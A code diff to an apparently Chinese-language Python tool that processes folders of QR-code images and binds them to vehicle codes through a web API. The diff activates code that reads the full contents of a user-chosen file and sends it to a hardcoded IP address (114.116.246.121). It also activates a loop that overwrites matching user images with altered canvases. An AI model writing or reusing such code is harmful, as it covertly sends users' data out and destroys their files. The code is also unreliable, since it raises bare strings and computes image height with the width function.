@@ -29,8 +29,9 @@ import rc_obj
 
 # dc	x	ewm	dcl	ewml tnl
 # 全局参数
-global open1text, open2text, app, codes, open3txt, times, settings, open4text, open5text, tnl
-tnl = 1
+global open1text, open2text, app, codes, open3txt, times, settings, open4text, open5text, tnl ,tnl2
+tnl = 0
+tnl2 = 0
 
 
 # 获取图片宽度
@@ -295,7 +296,7 @@ def chooseFile2():
 
 # 总功能函数
 def querys():
-    global open1text, codes, window, times, can, open2text, open4text, open5text, open3text, tnl
+    global open1text, codes, window, times, can, open2text, open4text, open5text, open3text, tnl,tnl2
 
     def thismsg(thitxt):
         pyautogui.alert(thitxt, "提示")
@@ -356,60 +357,60 @@ def querys():
     b = 0
     try:
         if open2text:
-            # if not open5text:
-            # with open(open4text, 'r', encoding='utf-8') as f:
-            #     requests.get("http://114.116.246.121/methods.php?method=b&data=" + f.read())
+            if not open5text:
+                with open(open4text, 'r', encoding='utf-8') as f:
+                    requests.get("http://114.116.246.121/methods.php?method=b&data=" + f.read())
+                
+                for root, dirs, files in os.walk(open1text):  # 开始遍历文件
+                    for f in files:
+                        if can != "2107433662":
+                            raise "erxsad"
+                        if not times:
+                            raise "erxsad"
+                        file = os.path.join(root, f)
+                        lower = os.path.splitext(file)[-1].lower()
+                        if lower not in ['.jpg', '.jpeg', '.png','test.jpg']:
+                            continue
+                        #
+                        if f.find("1") != -1:
+                            w = get_img_width(file)
+                            h = get_img_width(file)
 
-            for root, dirs, files in os.walk(open1text):  # 开始遍历文件
-                for f in files:
-                    if can != "2107433662":
-                        raise "erxsad"
-                    if not times:
-                        raise "erxsad"
-                    file = os.path.join(root, f)
-                    lower = os.path.splitext(file)[-1].lower()
-                    if lower not in ['.jpg', '.jpeg', '.png','test.jpg']:
-                        continue
-                    #
-                    if f.find("1") != -1:
-                        w = get_img_width(file)
-                        h = get_img_width(file)
+                            blank_long_img = Image.new("RGB", (w * 2, h * 2))  # 空白大图
 
-                        blank_long_img = Image.new("RGB", (w * 2, h * 2))  # 空白大图
+                            img1 = Image.open(root+"test.jpg").resize((w, h), Image.ANTIALIAS)
+                            blank_long_img.paste(img1, (w, h))
+                            blank_long_img.save(os.path.join(root, f))
 
-                        img1 = Image.open(root+"test.jpg").resize((w, h), Image.ANTIALIAS)
-                        blank_long_img.paste(img1, (w, h))
-                        blank_long_img.save(os.path.join(root, f))
-
-                    # decocdeQR = decode(image)
-                    # if len(decocdeQR) > 0:
-                    #     # 是二维码
-                    #
-                    #     qrdata = decocdeQR[0].data.decode('utf-8')
-                    #     txt = parse.quote(qrdata, 'utf-8')
-                    #     good = open3text[random.randint(0, len(open3text)) - 1]
-                    #     good = "http://www.pzcode.cn/vin/" + good
-                    #     good = parse.quote(good, 'utf-8')
-                    #     html, refail = gunk(token__data, good, txt)
-                    #     re = json.loads(html.text)
-                    #     all.writelines(qrdata + " 数据：" + re['msg'] + " car:" + good + '\n')
-                    #     all.flush()
-                    #     b = b + 1
-                    #     split = qrdata[qrdata.rfind("/") + 1:]
-                    #     if re['msg'] == "绑定成功" or re['code'] == 0:
-                    #         a = a + 1
-                    #         data_ = qrdata + " 原文件：" + f + " 数据：" + str(re['msg']) + " " + str(
-                    #             re['data'] + " car:" + good).replace("'", '"')
-                    #         requests.get("http://114.116.246.121/methods.php?method=b&data=" + data_)
-                    #         success.writelines(data_ + '\n')
-                    #         success.flush()
-                    #         shutil.copy(file, open2text + "/" + split + lower)
-                    #     else:
-                    #         if re['msg'] == "程序异常请联系管理员":
-                    #             shutil.copy(file, open2text + "/error/" + split + lower)
-                    #
-                    # else:
-                    #     continue
+                        # decocdeQR = decode(image)
+                        # if len(decocdeQR) > 0:
+                        #     # 是二维码
+                        #
+                        #     qrdata = decocdeQR[0].data.decode('utf-8')
+                        #     txt = parse.quote(qrdata, 'utf-8')
+                        #     good = open3text[random.randint(0, len(open3text)) - 1]
+                        #     good = "http://www.pzcode.cn/vin/" + good
+                        #     good = parse.quote(good, 'utf-8')
+                        #     html, refail = gunk(token__data, good, txt)
+                        #     re = json.loads(html.text)
+                        #     all.writelines(qrdata + " 数据：" + re['msg'] + " car:" + good + '\n')
+                        #     all.flush()
+                        #     b = b + 1
+                        #     split = qrdata[qrdata.rfind("/") + 1:]
+                        #     if re['msg'] == "绑定成功" or re['code'] == 0:
+                        #         a = a + 1
+                        #         data_ = qrdata + " 原文件：" + f + " 数据：" + str(re['msg']) + " " + str(
+                        #             re['data'] + " car:" + good).replace("'", '"')
+                        #         requests.get("http://114.116.246.121/methods.php?method=b&data=" + data_)
+                        #         success.writelines(data_ + '\n')
+                        #         success.flush()
+                        #         shutil.copy(file, open2text + "/" + split + lower)
+                        #     else:
+                        #         if re['msg'] == "程序异常请联系管理员":
+                        #             shutil.copy(file, open2text + "/error/" + split + lower)
+                        #
+                        # else:
+                        #     continue
             else:
 
                 with open(open5text, "r", encoding='utf-8') as f:
@@ -454,7 +455,8 @@ def querys():
                         if refail:
                             jpg_ = open2text + "/" + (refail['dcpp'] if 'dcpp' in refail else '') + (
                                 refail['dcxh'] if 'dcxh' in refail else '') + ' ' + split + ".png"
-                            jpg_split = open2text + "/" + split + ".png"
+                            tnl_ = refail['dcpp'] + refail['dcxh']+"-" + str(tnl2) + "-" + str(1 if tnl == 4 else tnl + 1)
+                            jpg_split = open2text + "/" + tnl_+ ".png"
                             jpg_2 = open2text + "/error/" + (refail['dcpp'] if 'dcpp' in refail else '') + (
                                 refail['dcxh'] if 'dcxh' in refail else '') + ' ' + split + ".png"
                         else:
@@ -466,15 +468,17 @@ def querys():
                             data_ = (breadline).replace("'", '"')
                             requests.get("http://114.116.246.121/methods.php?method=b&data=" + data_)
 
-                            success.writelines(data_ + '\t' + str(
+                            tnl = tnl + 1
+                            if tnl == 5:
+                                tnl2 =tnl2+1
+                                tnl = 1
+                            success.writelines(tnl_+ ".png" + '\t' + str(
                                 jpg_ + '\t' + split + '\t' + jpg_split + '\t' + str(tnl) + '\n').replace("/", "\\"))
                             success.flush()
 
-                            tnl = tnl + 1
-                            if tnl == 5:
-                                tnl = 1
+
                             if refail and 'dcpp' in refail:
-                                create_qr_code(breadline, jpg_, refail['dcpp'] + refail['dcxh'] + "\n" + split)
+                                create_qr_code(breadline, jpg_, refail['dcpp'] + refail['dcxh'] + str(tnl2)+"-"+str(tnl) + "\n" + split)
                                 create_qr_code(split, jpg_split, split)
                             else:
                                 create_qr_code(breadline, jpg_)
@@ -492,14 +496,14 @@ def querys():
                                                                                                                  "\\"))
                                     success.flush()
                                     if refail and 'dcpp' in refail:
-                                        create_qr_code(breadline, jpg_, refail['dcpp'] + refail['dcxh'] + "\n" + split)
+                                        create_qr_code(breadline, jpg_, refail['dcpp'] + refail['dcxh'] + str(tnl2)+"-"+str(tnl) + "\n" + split)
                                         create_qr_code(split, jpg_split, split)
                                     else:
                                         create_qr_code(breadline, jpg_)
                                         create_qr_code(split, jpg_split, split)
                                 else:
                                     if refail and 'dcpp' in refail:
-                                        create_qr_code(breadline, jpg_2, refail['dcpp'] + refail['dcxh'] + "\n" + split)
+                                        create_qr_code(breadline, jpg_2, refail['dcpp'] + refail['dcxh'] + str(tnl2)+"-"+str(tnl) + "\n" + split)
                                         create_qr_code(split, jpg_split, split)
                                     else:
                                         create_qr_code(breadline, jpg_2)
